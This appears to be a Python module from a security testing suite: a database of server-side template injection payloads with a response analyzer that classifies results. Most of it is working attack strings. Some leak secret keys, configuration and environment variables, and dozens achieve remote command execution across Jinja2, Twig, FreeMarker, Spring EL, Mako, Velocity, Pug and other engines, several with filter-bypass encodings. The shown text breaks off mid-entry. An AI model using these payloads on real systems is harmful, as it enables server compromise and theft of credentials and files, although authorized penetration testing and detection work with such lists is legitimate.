#!/usr/bin/env python3
"""
Structured SSTI Payload Database & Response Analyzer

Every payload knows its engine, expected response, and verification method.
Source: PayloadsAllTheThings + mutations.

Detection logic uses 5-case analysis:
  A) Payload reflected verbatim → no template processing (possible XSS)
  B) Nothing in response       → clean, or blind SSTI
  C) Expected result present    → SSTI confirmed
  D) Partial processing         → template engine active, escalate
  E) Payload encoded/escaped    → WAF/sanitization, try bypass

Author: Security Testing Suite
License: Authorized security research only
"""

import re
import html
import urllib.parse
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from enum import Enum


# =============================================================================
# DATA STRUCTURES
# =============================================================================

class SSTIPhase(Enum):
    DETECTION = "detection"        # Safe math probes
    INFO_DISCLOSURE = "info"       # Leak config/env/version
    RCE = "rce"                    # Command execution
    FILTER_BYPASS = "bypass"       # WAF evasion variants


class SSTICase(Enum):
    REFLECTED = "reflected"        # Case A: payload echoed back verbatim
    CLEAN = "clean"                # Case B: nothing, probably not vulnerable
    CONFIRMED = "confirmed"        # Case C: expected result found
    PARTIAL = "partial"            # Case D: delimiters processed, expression not evaluated
    ENCODED = "encoded"            # Case E: payload HTML/URL encoded


@dataclass
class SSTICheckResult:
    case: SSTICase
    confidence: float              # 0.0 - 1.0
    evidence: str
    engine: Optional[str] = None
    needs_manual_check: bool = False


# =============================================================================
# PAYLOAD DATABASE
#
# Each entry: {
#   'payload':         str,        # the injection string
#   'engine':          str,        # target template engine
#   'phase':           SSTIPhase,  # detection/info/rce/bypass
#   'expected':        str|list,   # literal string(s) to find in response
#   'expected_re':     str|None,   # regex alternative (if literal not enough)
#   'needs_baseline':  bool,       # True if expected value is common (49, 14, 0...)
#   'unique':          bool,       # True if expected value NEVER appears naturally
#   'description':     str,
# }
# =============================================================================

# ---------------------------------------------------------------------------
# PHASE 1: DETECTION — safe math probes, ordered by specificity
# ---------------------------------------------------------------------------

DETECTION_PAYLOADS = [
    # --- Unique expressions (strongest, no baseline needed) ---
    {
        'payload': '{{49163*49163}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.DETECTION,
        'expected': '2417001769',
        'expected_re': None,
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2/Twig unique math (causal proof)',
    },
    {
        'payload': '${49163*49163}',
        'engine': 'freemarker',
        'phase': SSTIPhase.DETECTION,
        'expected': '2417001769',
        'expected_re': None,
        'needs_baseline': False,
        'unique': True,
        'description': 'FreeMarker/Groovy/Mako unique math',
    },
    {
        'payload': '<%= 49163*49163 %>',
        'engine': 'erb',
        'phase': SSTIPhase.DETECTION,
        'expected': '2417001769',
        'expected_re': None,
        'needs_baseline': False,
        'unique': True,
        'description': 'ERB unique math',
    },
    {
        'payload': '#{49163*49163}',
        'engine': 'slim',
        'phase': SSTIPhase.DETECTION,
        'expected': '2417001769',
        'expected_re': None,
        'needs_baseline': False,
        'unique': True,
        'description': 'Slim/Pug/EL unique math',
    },

    # --- Polyglot (tests multiple engines at once) ---
    {
        'payload': '{{4*4}}[[5*5]]',
        'engine': 'polyglot',
        'phase': SSTIPhase.DETECTION,
        'expected': ['16', '25'],
        'expected_re': None,
        'needs_baseline': True,
        'unique': False,
        'description': 'Polyglot: Jinja2/Twig (16) + Thymeleaf (25)',
    },

    # --- Classic math probes (need baseline) ---
    {
        'payload': '{{7*7}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.DETECTION,
        'expected': '49',
        'expected_re': None,
        'needs_baseline': True,
        'unique': False,
        'description': 'Jinja2/Twig/Tornado/Nunjucks/Handlebars math',
    },
    {
        'payload': "{{7*'7'}}",
        'engine': 'jinja2',
        'phase': SSTIPhase.DETECTION,
        'expected': '7777777',
        'expected_re': None,
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 string multiplication (differentiates from Twig: Twig returns 49)',
    },
    {
        'payload': '<%= 7 * 7 %>',
        'engine': 'erb',
        'phase': SSTIPhase.DETECTION,
        'expected': '49',
        'expected_re': None,
        'needs_baseline': True,
        'unique': False,
        'description': 'ERB/Erubi/Erubis math',
    },
    {
        'payload': '${3*3}',
        'engine': 'freemarker',
        'phase': SSTIPhase.DETECTION,
        'expected': '9',
        'expected_re': None,
        'needs_baseline': True,
        'unique': False,
        'description': 'FreeMarker/Groovy/Mako/Spring EL/Chameleon math',
    },
    {
        'payload': '${{7*7}}',
        'engine': 'spring_el',
        'phase': SSTIPhase.DETECTION,
        'expected': '49',
        'expected_re': None,
        'needs_baseline': True,
        'unique': False,
        'description': 'Spring EL / nested expression',
    },
    {
        'payload': '@(1+2)',
        'engine': 'razor',
        'phase': SSTIPhase.DETECTION,
        'expected': '3',
        'expected_re': None,
        'needs_baseline': True,
        'unique': False,
        'description': 'ASP.NET Razor math',
    },
    {
        'payload': '#{3*3}',
        'engine': 'slim',
        'phase': SSTIPhase.DETECTION,
        'expected': '9',
        'expected_re': None,
        'needs_baseline': True,
        'unique': False,
        'description': 'Ruby Slim / Pug / FreeMarker legacy / Codepen',
    },
    {
        'payload': '#{ 7 * 7 }',
        'engine': 'slim',
        'phase': SSTIPhase.DETECTION,
        'expected': '49',
        'expected_re': None,
        'needs_baseline': True,
        'unique': False,
        'description': 'Slim with spaces',
    },
    {
        'payload': '*{7*7}',
        'engine': 'thymeleaf',
        'phase': SSTIPhase.DETECTION,
        'expected': '49',
        'expected_re': None,
        'needs_baseline': True,
        'unique': False,
        'description': 'Spring/Thymeleaf selection expression',
    },
    {
        'payload': '[=3*3]',
        'engine': 'freemarker',
        'phase': SSTIPhase.DETECTION,
        'expected': '9',
        'expected_re': None,
        'needs_baseline': True,
        'unique': False,
        'description': 'FreeMarker alternative syntax (>= 2.3.4)',
    },

    # --- Velocity ---
    {
        'payload': '#set($x=7*7)${x}',
        'engine': 'velocity',
        'phase': SSTIPhase.DETECTION,
        'expected': '49',
        'expected_re': None,
        'needs_baseline': True,
        'unique': False,
        'description': 'Velocity set + render',
    },

    # --- Django ---
    {
        'payload': 'ih0vr{{364|add:733}}d121r',
        'engine': 'django',
        'phase': SSTIPhase.DETECTION,
        'expected': 'ih0vr1097d121r',
        'expected_re': None,
        'needs_baseline': False,
        'unique': True,
        'description': 'Django template add filter (unique canary)',
    },

    # --- Latte (PHP) ---
    {
        'payload': '{var $X="ssti_poc_49163"}{$X}',
        'engine': 'latte',
        'phase': SSTIPhase.DETECTION,
        'expected': 'ssti_poc_49163',
        'expected_re': None,
        'needs_baseline': False,
        'unique': True,
        'description': 'Latte variable assignment and render',
    },

    # --- Lodash (JavaScript) ---
    {
        'payload': '{{= 7*7}}',
        'engine': 'lodash',
        'phase': SSTIPhase.DETECTION,
        'expected': '49',
        'expected_re': None,
        'needs_baseline': True,
        'unique': False,
        'description': 'Lodash/DotJS interpolate',
    },
]


# ---------------------------------------------------------------------------
# PHASE 2: INFO DISCLOSURE — leak config, env, version, objects
# ---------------------------------------------------------------------------

INFO_PAYLOADS = [
    # --- Jinja2 / Flask ---
    {
        'payload': '{{config.items()}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r'SECRET_KEY|DEBUG|SQLALCHEMY|DATABASE_URI',
        'needs_baseline': True,
        'unique': False,
        'description': 'Jinja2/Flask config dump',
    },
    {
        'payload': '{{ request }}',
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r'<Request|Request\s+(at|method|url)|environ\{|WSGIRequest',
        'needs_baseline': True,
        'unique': False,
        'description': 'Jinja2/Flask request object',
    },
    {
        'payload': '{{self}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r'TemplateReference|Template|Undefined',
        'needs_baseline': True,
        'unique': False,
        'description': 'Jinja2 self reference',
    },
    {
        'payload': '{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}',
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r'SECRET_KEY|DEBUG|<dt>.*</dt>',
        'needs_baseline': True,
        'unique': False,
        'description': 'Jinja2 config iteration',
    },
    {
        'payload': '{{ self.__init__.__globals__.__builtins__ }}',
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r"__import__|open|eval|exec|getattr",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 builtins access',
    },

    # --- Jinja2 class enumeration ---
    {
        'payload': "{{ [].class.base.subclasses() }}",
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r"<class\s+'[^']+'>",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 class enumeration via []',
    },
    {
        'payload': "{{''.class.mro()[1].subclasses()}}",
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r"<class\s+'[^']+'>",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 class enumeration via string MRO',
    },
    {
        'payload': "{{ ''.__class__.__mro__[2].__subclasses__() }}",
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r"<class\s+'[^']+'>",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 class enumeration via __mro__',
    },

    # --- Jinja2 globals access (context-free) ---
    {
        'payload': '{{cycler.__init__.__globals__.os}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r"<module\s+'os'",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 os module via cycler (Podalirius)',
    },
    {
        'payload': '{{joiner.__init__.__globals__.os}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r"<module\s+'os'",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 os module via joiner (Podalirius)',
    },
    {
        'payload': '{{namespace.__init__.__globals__.os}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r"<module\s+'os'",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 os module via namespace (Podalirius)',
    },
    {
        'payload': '{{self._TemplateReference__context.cycler.__init__.__globals__.os}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r"<module\s+'os'",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 os module via TemplateReference context',
    },
    {
        'payload': '{{self._TemplateReference__context.joiner.__init__.__globals__.os}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r"<module\s+'os'",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 os module via TemplateReference joiner',
    },
    {
        'payload': '{{self._TemplateReference__context.namespace.__init__.__globals__.os}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r"<module\s+'os'",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 os module via TemplateReference namespace',
    },

    # --- Twig ---
    {
        'payload': '{{dump(app)}}',
        'engine': 'twig',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r'AppKernel|Symfony\\|kernel\.',
        'needs_baseline': False,
        'unique': True,
        'description': 'Twig dump(app) — Symfony info',
    },
    {
        'payload': "{{app.request.server.all|join(',')}}",
        'engine': 'twig',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r'SERVER_SOFTWARE|DOCUMENT_ROOT|SCRIPT_FILENAME|HTTP_HOST',
        'needs_baseline': False,
        'unique': True,
        'description': 'Twig server variable dump',
    },

    # --- Jinjava (Java) ---
    {
        'payload': "{{'a'.toUpperCase()}}",
        'engine': 'jinjava',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': 'A',
        'expected_re': None,
        'needs_baseline': True,
        'unique': False,
        'description': 'Jinjava string method (returns A)',
    },

    # --- Smarty ---
    {
        'payload': '{$smarty.version}',
        'engine': 'smarty',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r'Smarty[- ]?\d+\.\d+',
        'needs_baseline': False,
        'unique': True,
        'description': 'Smarty version disclosure',
    },

    # --- Spring EL ---
    {
        'payload': '${T(java.lang.System).getenv()}',
        'engine': 'spring_el',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r'(?:PATH|HOME|JAVA_HOME|LANG|USER)=',
        'needs_baseline': False,
        'unique': True,
        'description': 'Spring EL environment variables',
    },

    # --- Java generic ---
    {
        'payload': '${class.getClassLoader()}',
        'engine': 'java',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r'ClassLoader|URLClassLoader|AppClassLoader',
        'needs_baseline': False,
        'unique': True,
        'description': 'Java class loader access',
    },
    {
        'payload': "${class.getResource('').getPath()}",
        'engine': 'java',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r'(/[a-zA-Z0-9._-]+){2,}',
        'needs_baseline': True,
        'unique': False,
        'description': 'Java resource path disclosure',
    },

    # --- Django ---
    {
        'payload': '{% debug %}',
        'engine': 'django',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r"'context'|'request'|'forloop'",
        'needs_baseline': False,
        'unique': True,
        'description': 'Django debug statement',
    },
    {
        'payload': '{{ messages.storages.0.signer.key }}',
        'engine': 'django',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r'.{20,}',  # Secret key is a long random string
        'needs_baseline': True,
        'unique': False,
        'description': 'Django secret key leak',
    },

    # --- Lodash ---
    {
        'payload': '{{= _.VERSION}}',
        'engine': 'lodash',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r'\d+\.\d+\.\d+',
        'needs_baseline': True,
        'unique': False,
        'description': 'Lodash version disclosure',
    },

    # --- Handlebars ---
    {
        'payload': '{{this}}',
        'engine': 'handlebars',
        'phase': SSTIPhase.INFO_DISCLOSURE,
        'expected': None,
        'expected_re': r'\[object Object\]|{.*:.*}',
        'needs_baseline': True,
        'unique': False,
        'description': 'Handlebars context dump',
    },
]


# ---------------------------------------------------------------------------
# PHASE 3: RCE — command execution
# ---------------------------------------------------------------------------

# Shared RCE output patterns (used by all engines)
_RCE_PATTERNS = [
    re.compile(r'uid=\d+\(\w+\)\s+gid=\d+'),              # id command
    re.compile(r'root:.*:0:0:', re.M),                      # /etc/passwd
    re.compile(r'(?:^|\n)\s*(root|www-data|apache|nginx|nobody)\s*$', re.M),  # whoami
    re.compile(r'Linux\s+\S+\s+\d+\.\d+'),                 # uname -a
]


def _rce_entry(payload, engine, description):
    """Helper to create RCE payload entries (all share the same expected patterns)."""
    return {
        'payload': payload,
        'engine': engine,
        'phase': SSTIPhase.RCE,
        'expected': None,
        'expected_re': None,  # Uses _RCE_PATTERNS instead
        'needs_baseline': False,
        'unique': True,
        'description': description,
    }


RCE_PAYLOADS = [
    # --- ERB (Ruby) ---
    _rce_entry(
        "<%= File.open('/etc/passwd').read %>",
        'erb', 'ERB file read /etc/passwd'),
    _rce_entry(
        "<%= system('id') %>",
        'erb', 'ERB system() command'),
    _rce_entry(
        "<%= `id` %>",
        'erb', 'ERB backtick command'),
    _rce_entry(
        "<%= IO.popen('id').readlines() %>",
        'erb', 'ERB IO.popen command'),

    # --- FreeMarker ---
    _rce_entry(
        '<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}',
        'freemarker', 'FreeMarker Execute class (angle bracket syntax)'),
    _rce_entry(
        "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}",
        'freemarker', 'FreeMarker Execute class (square bracket syntax)'),
    _rce_entry(
        '${"freemarker.template.utility.Execute"?new()("id")}',
        'freemarker', 'FreeMarker inline Execute'),
    _rce_entry(
        '#{"freemarker.template.utility.Execute"?new()("id")}',
        'freemarker', 'FreeMarker legacy syntax Execute'),
    _rce_entry(
        '[="freemarker.template.utility.Execute"?new()("id")]',
        'freemarker', 'FreeMarker alternative syntax Execute'),

    # --- Twig (PHP) ---
    _rce_entry(
        "{{['id']|filter('system')}}",
        'twig', 'Twig filter(system) RCE'),
    _rce_entry(
        "{{['cat\\x20/etc/passwd']|filter('system')}}",
        'twig', 'Twig filter(system) /etc/passwd with \\x20'),
    _rce_entry(
        "{{['cat$IFS/etc/passwd']|filter('system')}}",
        'twig', 'Twig filter(system) /etc/passwd with $IFS'),
    _rce_entry(
        "{{[0]|reduce('system','id')}}",
        'twig', 'Twig reduce(system) RCE'),
    _rce_entry(
        "{{['id']|map('system')|join}}",
        'twig', 'Twig map(system) RCE'),
    _rce_entry(
        "{{['id',1]|sort('system')|join}}",
        'twig', 'Twig sort(system) RCE'),
    _rce_entry(
        "{{['id']|filter('passthru')}}",
        'twig', 'Twig filter(passthru) RCE'),
    _rce_entry(
        "{{['id']|map('passthru')}}",
        'twig', 'Twig map(passthru) RCE'),
    _rce_entry(
        "{{app.request.query.filter(0,0,1024,{'options':'system'})}}",
        'twig', 'Twig app.request RCE (Symfony)'),
    _rce_entry(
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        'twig', 'Twig registerUndefinedFilterCallback RCE'),

    # --- Smarty (PHP) ---
    _rce_entry(
        '{php}echo `id`;{/php}',
        'smarty', 'Smarty {php} tag RCE (v2 only)'),
    _rce_entry(
        "{system('id')}",
        'smarty', 'Smarty system() RCE (v3)'),

    # --- Jinja2 (Python) — class chain RCE ---
    _rce_entry(
        "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
        'jinja2', 'Jinja2 subclass File read /etc/passwd'),
    _rce_entry(
        "{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
        'jinja2', 'Jinja2 config chain read /etc/passwd'),
    _rce_entry(
        "{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",
        'jinja2', 'Jinja2 subprocess.Popen RCE'),
    _rce_entry(
        "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
        'jinja2', 'Jinja2 os.popen via config globals'),
    _rce_entry(
        "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
        'jinja2', 'Jinja2 os.popen via builtins'),
    _rce_entry(
        "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
        'jinja2', 'Jinja2 os.popen via cycler context'),
    _rce_entry(
        "{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}",
        'jinja2', 'Jinja2 os.popen via joiner context'),
    _rce_entry(
        "{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}",
        'jinja2', 'Jinja2 os.popen via namespace context'),
    _rce_entry(
        "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
        'jinja2', 'Jinja2 os.popen via cycler (short)'),
    _rce_entry(
        "{{ joiner.__init__.__globals__.os.popen('id').read() }}",
        'jinja2', 'Jinja2 os.popen via joiner (short)'),
    _rce_entry(
        "{{ namespace.__init__.__globals__.os.popen('id').read() }}",
        'jinja2', 'Jinja2 os.popen via namespace (short)'),
    _rce_entry(
        "{{ lipsum.__globals__['os'].popen('id').read() }}",
        'jinja2', 'Jinja2 os.popen via lipsum (shortest)'),
    _rce_entry(
        "{% for x in ().__class__.__base__.__subclasses__() %}"
        "{% if \"warning\" in x.__name__ %}"
        "{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}"
        "{%endif%}{%endfor%}",
        'jinja2', 'Jinja2 Popen without guessing offset'),

    # --- Jinjava (Java) — ScriptEngine RCE ---
    _rce_entry(
        "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance()"
        ".getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}",
        'jinjava', 'Jinjava ScriptEngine basic eval'),
    _rce_entry(
        "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance()"
        ".getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder;"
        " x.command(\\\\\"whoami\\\\\"); x.start()\")}}",
        'jinjava', 'Jinjava ScriptEngine whoami'),
    _rce_entry(
        "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance()"
        ".getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder;"
        " x.command(\\\\\"uname\\\\\",\\\\\"-a\\\\\");"
        " org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}",
        'jinjava', 'Jinjava ScriptEngine uname -a'),

    # --- Spring EL (Java) ---
    _rce_entry(
        "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
        'spring_el', 'Spring EL Runtime exec'),
    _rce_entry(
        "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("
        "T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97))"
        ".concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32))"
        ".concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101))"
        ".concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99))"
        ".concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112))"
        ".concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115))"
        ".concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119))"
        ".concat(T(java.lang.Character).toString(100))).getInputStream())}",
        'spring_el', 'Spring EL Runtime exec with Character.toString bypass'),

    # --- Velocity (Java) ---
    _rce_entry(
        '#set($str=$class.inspect("java.lang.String").type)'
        '#set($chr=$class.inspect("java.lang.Character").type)'
        '#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))'
        '$ex.waitFor()'
        '#set($out=$ex.getInputStream())'
        '#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end',
        'velocity', 'Velocity Runtime.exec with output'),

    # --- Groovy ---
    _rce_entry(
        '${"id".execute().text}',
        'groovy', 'Groovy execute() RCE'),
    _rce_entry(
        '${new org.codehaus.groovy.runtime.MethodClosure("id","execute").call()}',
        'groovy', 'Groovy MethodClosure RCE'),

    # --- Pebble (Java) ---
    _rce_entry(
        '{% set cmd = \'id\' %}'
        '{% set bytes = (1).TYPE.forName(\'java.lang.Runtime\').methods[6]'
        '.invoke(null,null).exec(cmd).inputStream.readAllBytes() %}'
        '{{ (1).TYPE.forName(\'java.lang.String\').constructors[0]'
        '.newInstance(([bytes]).toArray()) }}',
        'pebble', 'Pebble Runtime exec (new version)'),

    # --- Mako (Python) — self.module chain RCE ---
    # These use os.system() which returns exit code (0), not command output.
    # The template renders "0" in the response.
    # For each, we also check RCE output patterns in case stdout is captured.
    _rce_entry('${self.module.cache.util.os.system("id")}', 'mako', 'Mako module.cache.util.os'),
    _rce_entry('${self.module.runtime.util.os.system("id")}', 'mako', 'Mako module.runtime.util.os'),
    _rce_entry('${self.template.module.cache.util.os.system("id")}', 'mako', 'Mako template.module.cache'),
    _rce_entry('${self.module.cache.compat.inspect.os.system("id")}', 'mako', 'Mako cache.compat.inspect'),
    _rce_entry("${self.__init__.__globals__['util'].os.system('id')}", 'mako', 'Mako __init__.__globals__'),
    _rce_entry('${self.template.module.runtime.util.os.system("id")}', 'mako', 'Mako template.runtime'),
    _rce_entry('${self.module.filters.compat.inspect.os.system("id")}', 'mako', 'Mako filters.compat'),
    _rce_entry('${self.module.runtime.compat.inspect.os.system("id")}', 'mako', 'Mako runtime.compat'),
    _rce_entry('${self.module.runtime.exceptions.util.os.system("id")}', 'mako', 'Mako runtime.exceptions'),
    _rce_entry("${self.template.__init__.__globals__['os'].system('id')}", 'mako', 'Mako template.__init__'),
    _rce_entry('${self.module.cache.util.compat.inspect.os.system("id")}', 'mako', 'Mako cache.util.compat'),
    _rce_entry('${self.module.runtime.util.compat.inspect.os.system("id")}', 'mako', 'Mako runtime.util.compat'),
    _rce_entry('${self.template._mmarker.module.cache.util.os.system("id")}', 'mako', 'Mako _mmarker.cache'),
    _rce_entry('${self.template.module.cache.compat.inspect.os.system("id")}', 'mako', 'Mako template.cache.compat'),
    _rce_entry('${self.module.cache.compat.inspect.linecache.os.system("id")}', 'mako', 'Mako cache.linecache'),
    _rce_entry('${self.template._mmarker.module.runtime.util.os.system("id")}', 'mako', 'Mako _mmarker.runtime'),
    _rce_entry('${self.attr._NSAttr__parent.module.cache.util.os.system("id")}', 'mako', 'Mako NSAttr.cache'),
    _rce_entry('${self.template.module.filters.compat.inspect.os.system("id")}', 'mako', 'Mako template.filters'),
    _rce_entry('${self.template.module.runtime.compat.inspect.os.system("id")}', 'mako', 'Mako template.runtime.compat'),
    _rce_entry('${self.module.filters.compat.inspect.linecache.os.system("id")}', 'mako', 'Mako filters.linecache'),
    _rce_entry('${self.module.runtime.compat.inspect.linecache.os.system("id")}', 'mako', 'Mako runtime.linecache'),
    _rce_entry('${self.template.module.runtime.exceptions.util.os.system("id")}', 'mako', 'Mako template.runtime.exceptions'),
    _rce_entry('${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}', 'mako', 'Mako NSAttr.runtime'),
    _rce_entry('${self.context._with_template.module.cache.util.os.system("id")}', 'mako', 'Mako context.cache'),
    _rce_entry('${self.module.runtime.exceptions.compat.inspect.os.system("id")}', 'mako', 'Mako runtime.exceptions.compat'),
    _rce_entry('${self.template.module.cache.util.compat.inspect.os.system("id")}', 'mako', 'Mako template.cache.util.compat'),
    _rce_entry('${self.context._with_template.module.runtime.util.os.system("id")}', 'mako', 'Mako context.runtime'),
    _rce_entry('${self.module.cache.util.compat.inspect.linecache.os.system("id")}', 'mako', 'Mako cache.util.linecache'),
    _rce_entry('${self.template.module.runtime.util.compat.inspect.os.system("id")}', 'mako', 'Mako template.runtime.util.compat'),
    _rce_entry('${self.module.runtime.util.compat.inspect.linecache.os.system("id")}', 'mako', 'Mako runtime.util.linecache'),
    _rce_entry('${self.module.runtime.exceptions.traceback.linecache.os.system("id")}', 'mako', 'Mako traceback.linecache'),
    _rce_entry('${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}', 'mako', 'Mako exceptions.util.compat'),
    _rce_entry('${self.template._mmarker.module.cache.compat.inspect.os.system("id")}', 'mako', 'Mako _mmarker.cache.compat'),
    _rce_entry('${self.template.module.cache.compat.inspect.linecache.os.system("id")}', 'mako', 'Mako template.cache.linecache'),
    _rce_entry('${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}', 'mako', 'Mako NSAttr.template.cache'),
    _rce_entry('${self.template._mmarker.module.filters.compat.inspect.os.system("id")}', 'mako', 'Mako _mmarker.filters'),
    _rce_entry('${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}', 'mako', 'Mako _mmarker.runtime.compat'),
    _rce_entry('${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}', 'mako', 'Mako NSAttr.cache.compat'),
    _rce_entry('${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}', 'mako', 'Mako _mmarker.runtime.exceptions'),
    _rce_entry('${self.template.module.filters.compat.inspect.linecache.os.system("id")}', 'mako', 'Mako template.filters.linecache'),
    _rce_entry('${self.template.module.runtime.compat.inspect.linecache.os.system("id")}', 'mako', 'Mako template.runtime.linecache'),
    _rce_entry('${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}', 'mako', 'Mako NSAttr.template.runtime'),
    _rce_entry('${self.context._with_template._mmarker.module.cache.util.os.system("id")}', 'mako', 'Mako context._mmarker.cache'),
    _rce_entry('${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}', 'mako', 'Mako template.runtime.exceptions.compat'),
    _rce_entry('${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}', 'mako', 'Mako NSAttr.filters.compat'),
    _rce_entry('${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}', 'mako', 'Mako NSAttr.runtime.compat'),
    _rce_entry('${self.context._with_template.module.cache.compat.inspect.os.system("id")}', 'mako', 'Mako context.cache.compat'),
    _rce_entry('${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}', 'mako', 'Mako runtime.exceptions.linecache'),
    _rce_entry('${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}', 'mako', 'Mako NSAttr.runtime.exceptions'),
    _rce_entry('${self.context._with_template._mmarker.module.runtime.util.os.system("id")}', 'mako', 'Mako context._mmarker.runtime'),
    _rce_entry('${self.context._with_template.module.filters.compat.inspect.os.system("id")}', 'mako', 'Mako context.filters.compat'),
    _rce_entry('${self.context._with_template.module.runtime.compat.inspect.os.system("id")}', 'mako', 'Mako context.runtime.compat'),
    _rce_entry('${self.context._with_template.module.runtime.exceptions.util.os.system("id")}', 'mako', 'Mako context.runtime.exceptions'),
    _rce_entry('${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}', 'mako', 'Mako template.traceback.linecache'),

    # --- Tornado (Python) ---
    _rce_entry(
        "{% import os %}{{os.popen('id').read()}}",
        'tornado', 'Tornado import os + popen'),

    # --- Latte (PHP) ---
    _rce_entry(
        "{php system('id')}",
        'latte', 'Latte PHP system() RCE'),

    # --- Codepen / Pug (JavaScript) ---
    _rce_entry(
        "#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}",
        'pug', 'Pug/Codepen child_process RCE'),

    # --- Lodash (JavaScript) ---
    _rce_entry(
